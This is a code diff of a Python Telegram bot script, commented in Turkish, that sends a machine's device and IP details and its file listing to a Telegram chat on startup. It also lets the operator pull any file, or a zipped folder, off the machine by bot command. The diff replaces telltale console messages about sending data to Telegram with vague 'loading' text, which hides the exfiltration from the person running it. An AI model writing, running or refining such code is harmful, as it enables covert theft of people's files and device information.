@@ -156,15 +156,15 @@ def bilgileri_kaydet_ve_gonder():
         "╚══════════════════════╝"
     )
     requests.post(TELEGRAM_MESSAGE_API, data={"chat_id": CHAT_ID, "text": cihaz_mesaji})
-    print("Cihaz ve IP bilgisi mesaj olarak gönderildi!")
+    print("IN loading. . .")
     dosya_listesi, _ = dosya_tara()
     dosya_dosyasi = f"dosyalar_{zaman_damgasi}.json"
     with open(dosya_dosyasi, "w") as f:
         json.dump(dosya_listesi, f, indent=4, ensure_ascii=False)
-    print(f"Dosyalar {dosya_dosyasi} kaydedildi!")
+    print(f"FI loading . . .")
     with open(dosya_dosyasi, "rb") as f:
         requests.post(TELEGRAM_API, data={"chat_id": CHAT_ID}, files={"document": f})
-    print(f"{dosya_dosyasi} Telegram'a gönderildi!")
+    print(f"FI succesfully loaded")
 
 async def select_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Mesajın zamanı botun başlangıcından önceyse ignore et
@@ -175,12 +175,12 @@ async def select_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         numara = context.args[0]
         dosya_yolu = dosya_haritasi.get(numara)
         if not dosya_yolu or not os.path.exists(dosya_yolu):
-            await update.message.reply_text(f"Numara {numara} bulunamadı, kral! 😈")
+            await update.message.reply_text(f"Numara {numara} bulunamadı! 🚨")
             return
 
         with open(dosya_yolu, "rb") as f:
             await update.message.reply_document(document=f, filename=os.path.basename(dosya_yolu))
-        print(f"{numara} numaralı dosya ({dosya_yolu}) Telegram'a gönderildi!")
+        print(f"-FI-s")
     except Exception as e:
         await update.message.reply_text(f"Hata, dosya gönderilemedi! ({str(e)})")
 
@@ -193,9 +193,9 @@ async def category(update: Update, context: ContextTypes.DEFAULT_TYPE):
     _, klasorler = dosya_tara()  # Klasör listesini al
     kategori_listesi = "\n".join([f"{i+1}. {k}" for i, k in enumerate(klasorler.keys())])
     mesaj = (
-        "Kategori seç kral! 😈\n"
+        "Kategori Seç! 📜\n"
         f"{kategori_listesi}\n"
-        "Örnek: /category Download"
+        "Örnek: /category >Download<"
     )
     if not context.args:
         await update.message.reply_text(mesaj)
@@ -203,26 +203,26 @@ async def category(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     kategori = " ".join(context.args).strip()
     if kategori not in klasorler:
-        await update.message.reply_text(f"Geçersiz kategori: {kategori}, kral! 😈 Listeden seç:\n{mesaj}")
+        await update.message.reply_text(f"🚨 Geçersiz kategori: {kategori}, Listeden seç:\n{mesaj}")
         return
     
     klasor_yolu = klasorler[kategori]
     arsiv_yolu = arsiv_olustur(kategori, klasor_yolu)
     if not arsiv_yolu:
-        await update.message.reply_text(f"Arşiv oluşturulamadı, kral! 😈 Hata: {arsiv_yolu[1]}")
+        await update.message.reply_text(f"Arşiv oluşturulamadı. Hata: {arsiv_yolu[1]}")
         return
     
     try:
         with open(arsiv_yolu, "rb") as f:
             await update.message.reply_document(document=f, filename=os.path.basename(arsiv_yolu))
-        print(f"{kategori} kategorisi arşivi ({arsiv_yolu}) Telegram'a gönderildi!")
+        print(f"-ZI-s")
         os.remove(arsiv_yolu)  # Arşivi gönderildikten sonra sil
-        print(f"{arsiv_yolu} silindi!")
+        print(f"-ZI-d")
     except Exception as e:
         await update.message.reply_text(f"Hata, arşiv gönderilemedi: {str(e)}")
 
 def main():
-    print("Botu başlatıyorum, kral! 😈")
+    print("Started Running. . .")
     bilgileri_kaydet_ve_gonder()
     application = Application.builder().token(BOT_TOKEN).build()
     application.add_handler(CommandHandler("select", select_file))
